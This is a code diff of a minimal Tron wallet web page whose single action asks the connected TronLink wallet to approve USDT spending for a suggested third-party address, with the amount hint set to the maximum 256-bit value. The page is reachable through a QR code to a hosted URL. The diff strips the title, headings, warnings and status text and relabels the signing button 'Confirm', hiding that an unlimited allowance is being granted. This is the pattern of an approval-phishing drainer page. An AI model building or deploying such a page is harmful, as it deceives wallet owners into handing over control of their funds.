@@ -2,20 +2,25 @@
 <html lang="ro">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-  <title>TRC20 Approve PRO</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title></title>
 
   <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; font-family:Arial; }
+    * {
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family:Arial;
+    }
 
     body {
       height:100vh;
-      background:#0b1220;
       display:flex;
       justify-content:center;
       align-items:center;
+      background:#0b1220;
       color:white;
     }
 
@@ -31,8 +36,6 @@
       border-radius:16px;
     }
 
-    h2 { text-align:center; margin-bottom:10px; }
-
     input {
       width:100%;
       padding:12px;
@@ -41,6 +44,7 @@
       border:none;
       background:#1b2a4a;
       color:white;
+      outline:none;
     }
 
     button {
@@ -72,12 +76,6 @@
       padding:10px;
       border-radius:10px;
     }
-
-    .title {
-      text-align:center;
-      opacity:0.6;
-      margin-bottom:5px;
-    }
   </style>
 </head>
 
@@ -86,17 +84,14 @@
 <div class="app">
   <div class="card">
 
-    <div class="title">TRC20 APPROVE PRO</div>
-    <h2>USDT Approval</h2>
-
     <button class="blue" onclick="connectWallet()">Connect Wallet</button>
 
     <input id="spender" placeholder="TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu" />
     <input id="amount" placeholder="115792089237316195423570985008687907853269984665640564039457584007913129639935" />
 
-    <button class="green" onclick="approveUSDT()">Confirm & Sign</button>
+    <button class="green" onclick="approveUSDT()">Confirm</button>
 
-    <div id="status">Status: waiting...</div>
+    <div id="status"></div>
 
     <div id="qrcode"></div>
 
@@ -108,27 +103,7 @@
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
 let userAddress = null;
 
-/* =========================
-   PREFILL FROM QR
-========================= */
-function loadFromQR() {
-  const params = new URLSearchParams(window.location.search);
-
-  const spender = params.get("spender");
-  const amount = params.get("amount");
-
-  if (spender) {
-    document.getElementById("spender").value = spender;
-  }
-
-  if (amount) {
-    document.getElementById("amount").value = amount;
-  }
-}
-
-/* =========================
-   DETECT WALLET
-========================= */
+/* WALLET */
 function detectWallet() {
   let tries = 0;
 
@@ -139,55 +114,39 @@ function detectWallet() {
       userAddress = window.tronWeb.defaultAddress.base58;
 
       document.getElementById("status").innerText =
-        "Wallet detectat:\n" + userAddress;
+        userAddress;
 
       clearInterval(interval);
       return;
     }
 
-    if (tries > 20) {
-      document.getElementById("status").innerText =
-        "Deschide în TronLink DApp Browser!";
-      clearInterval(interval);
-    }
+    if (tries > 20) clearInterval(interval);
 
   }, 500);
 }
 
-/* =========================
-   CONNECT
-========================= */
+/* CONNECT */
 async function connectWallet() {
   try {
 
-    if (!window.tronLink) {
-      document.getElementById("status").innerText =
-        "TronLink NU este disponibil";
-      return;
-    }
+    if (!window.tronLink) return;
 
     await window.tronLink.request({ method: "tron_requestAccounts" });
 
     userAddress = window.tronWeb.defaultAddress.base58;
 
-    document.getElementById("status").innerText =
-      "Connected:\n" + userAddress;
+    document.getElementById("status").innerText = userAddress;
 
   } catch (e) {
     document.getElementById("status").innerText = e.message;
   }
 }
 
-/* =========================
-   APPROVE
-========================= */
+/* APPROVE */
 async function approveUSDT() {
   try {
 
-    if (!userAddress) {
-      alert("Connect wallet first");
-      return;
-    }
+    if (!userAddress) return;
 
     const spender = document.getElementById("spender").value;
     const amount = document.getElementById("amount").value;
@@ -196,34 +155,25 @@ async function approveUSDT() {
 
     const amountInSun = window.tronWeb.toSun(amount);
 
-    const tx = await contract.approve(spender, amountInSun).send();
+    await contract.approve(spender, amountInSun).send();
 
-    document.getElementById("status").innerText =
-      "Approve sent!\nTX:\n" + tx;
+    document.getElementById("status").innerText = "OK";
 
   } catch (e) {
     document.getElementById("status").innerText = e.message;
   }
 }
 
-/* =========================
-   QR GENERATOR (optional)
-========================= */
+/* QR */
 function generateQR() {
-
-  const url =
-    "https://approve-d-app-mt1q.vercel.app?spender=TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu&amount=100";
-
   new QRCode(document.getElementById("qrcode"), {
-    text: url,
-    width: 160,
-    height: 160
+    text: "https://approve-d-app-mt1q.vercel.app",
+    width: 150,
+    height: 150
   });
 }
 
-/* INIT */
 window.addEventListener("load", () => {
-  loadFromQR();
   detectWallet();
   generateQR();
 });
